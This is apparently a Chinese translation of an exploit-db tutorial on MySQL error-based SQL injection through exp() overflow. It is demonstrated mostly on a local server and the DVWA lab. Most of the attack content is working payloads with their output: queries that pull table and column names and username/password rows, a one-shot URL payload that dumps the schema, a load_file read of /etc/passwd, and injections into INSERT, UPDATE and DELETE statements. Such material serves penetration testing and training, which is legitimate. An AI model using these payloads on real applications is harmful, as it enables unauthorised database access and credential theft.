##本文译自[https://www.exploit-db.com/docs/37953.pdf](https://www.exploit-db.com/docs/37953.pdf)
----
#<center>MySQL Error Based SQL Injection Using EXP</center>  
<center>Osanda Malith Jayathissa</center>  
<center>(@OsandaMalith)</center>  
##概述  
这是我发现的另一种double类型的数据溢出。如果你想了解利用溢出来注入，可以读一下我之前发的文章：BIGINT Overflow Error based injections。问题和我之前的文章类似。我对mysql数学函数比较感兴趣，它们应当包含某些数据类型来保存数值。因此我就去测试哪些函数会造成溢出错误。我发现，当传一个大于709的数值时，exp()函数就会引起一个溢出错误。 
 
    mysql> select exp(709);
    +-----------------------+
    | exp(709)              |
    +-----------------------+
    | 8.218407461554972e307 |
    +-----------------------+
    1 row in set (0.00 sec)
    mysql> select exp(710);
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'  
exp()与ln()或log()是功能相反的mysql函数（反函数关系）。简短的介绍一下这些函数的作用，log()和ln()返回自然对数。
e通常情况下近似于2.71828183  

    mysql> select log(15);
    +------------------+
    | log(15)          |
    +------------------+
    | 2.70805020110221 |
    +------------------+
    1 row in set (0.00 sec)
    mysql> select ln(15);
    +------------------+
    | ln(15)           |
    +------------------+
    | 2.70805020110221 |
    +------------------+
    1 row in set (0.00 sec)
    
指数函数为对数函数的反函数，exp()会做相反的运算。  
  
    mysql> select exp(2.70805020110221);
    +-----------------------+
    | exp(2.70805020110221) |
    +-----------------------+
    |15                     |
    +-----------------------+
    1 row in set (0.00 sec)
    
##注入  
当要进行注入时，我们使用取反操作来使double类型超出范围。如果将一个查询结果按位取反就会返回18446744073709551615。如果你能回想起我之前的文章，这是将0按位取反的结果。因为函数执行成功时会返回0，我们将它按位取反会产生无符号BIGINT类型的最大值。    

    mysql> select ~0;
    +----------------------+
    | ~0                   |
    +----------------------+
    | 18446744073709551615 |
    +----------------------+
    1 row in set (0.00 sec)
    mysql> select ~(select version());
    +----------------------+
    | ~(select version())  |
    +----------------------+
    | 18446744073709551610 |
    +----------------------+
    1 row in set, 1 warning (0.00 sec) 

我们可以通过子查询和按位取反来造成double类型溢出错误获得额外的数据。：）  

    mysql> select exp(~(select*from(select user())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from
    dual)))'  
    
##提取数据  
####Getting table names:
    select exp(~(select*from(select table_name from information_schema.tables where table_schem
    a=database() limit 0,1)x));
####Getting column names:
    select exp(~(select*from(select column_name from information_schema.columns where table_n
    ame='users' limit 0,1)x));
####Retrieving Data:
    select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));  

##Dump In One Shot  
这个查询可以从当前的上下文中拖出所有的tables与columns。我们也可以拖出所有的数据库，但由于我们是通过一个错误进行提取，每次只会返回很少的数据。  

    http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select
    count(*)from`information_schema`.columns where
    table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,colum
    n_name)),@)))x))-- -&Submit=Submit#  

    Warning:mysql_query():Unable to save result set in C:\xampp\htdocs\dvwa\vnlnerabilities\sqli\source\low.php on line 10
    DOUBLE value is out of range in 'exp(~((select '000
    dvwa::guestbook::comment_id
    dvwa::guestbook::comment
    dvwa::guestbook::name
    dvwa::users::user_id
    dvwa::users::first_name
    dvwa::users::last_name
    dvwa::users:user
    dvwa::users::password
    dvwa::users::avatar' from dual)))'
##读取文件
你可以通过load_file()函数来读取文件，但注意它有13行的限制。  
    select exp(~(select*from(select load_file('/etc/passwd'))a));  
    
    mysql> select exp(~(select * from(select load_file('/etc/passwd'))a));)
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/
    ->   
    
注意，你无法写文件。因为这是个错误，只会写入0。  

    mysql> select exp(~(select*from(select 'hello')a)) into outfile 'C:/out.txt';
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'hello' from dual)))'
    # type C:\out.txt
    0

##在insert语句中注入  
所有的都和往常一样。 
 
    mysql> insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select
    user())x)), 'Eyre');
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from
    dual)))'  
    
对于所有的insert，update和delete语句DIOS查询也同样可以使用。  

    mysql> insert into users (id, username, password) values (2, '' |
    exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where
    table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,colum
    n_name)),@)))x)), 'Eyre');
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
    newdb::users::id
    newdb::users::username
    newdb::users::password' from dual)))'  
    
##在update语句中注入  

    mysql> update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from
    dual)))'  

##在delete语句中注入  

    mysql> delete from users where id='1' | exp(~(select*from(select user())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from
    dual)))'  

##小结  
和之前的BIGINT注入一样，利用exp注入也适用于MySQL5.5.5及以上版本。之前的版本无法利用成功。  

    mysql> select version();
    +---------------------+
    | version()           |
    +---------------------+
    | 5.0.45-community-nt |
    +---------------------+
    1 row in set (0.00 sec)
    mysql> select exp(710);
    +----------+
    | exp(710) |
    +----------+
    |   1.#INF |
    +----------+
    1 row in set (0.00 sec)
    mysql> select exp(~0);
    +---------+
    | exp(~0) |
    +---------+
    | 1.#INF  |
    +---------+
    1 row in set (0.00 sec)   

可能还会有其他函数会产生这种错误：）  

##References  
[1][http://dev.mysql.com/doc/refman/5.5/en/integer-types.html](http://dev.mysql.com/doc/refman/5.5/en/integer-types.html)  
[2][https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html](https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html)  
[3][https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html](https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html)



    
    
    
    
    
    
    
    
    
    
    
    
